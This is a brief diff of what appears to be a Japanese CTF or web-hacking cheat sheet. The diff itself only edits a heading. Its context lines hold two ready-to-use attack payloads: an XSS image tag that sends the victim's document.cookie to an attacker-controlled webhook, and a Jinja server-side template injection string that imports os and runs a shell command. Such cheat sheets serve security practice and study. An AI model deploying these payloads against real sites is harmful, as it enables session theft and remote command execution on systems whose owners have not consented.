@@ -9,7 +9,7 @@
 ```html:XSS
 &lt;img src=x onerror=fetch(atob('webhookURL(btoa)')+?cookie='+document.cookie)&gt;
 ```
-## SSTI:
+## SSTI
 問題にどこにファイルがあるかわからない時には
 ```Python:SSTI_ls
 {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
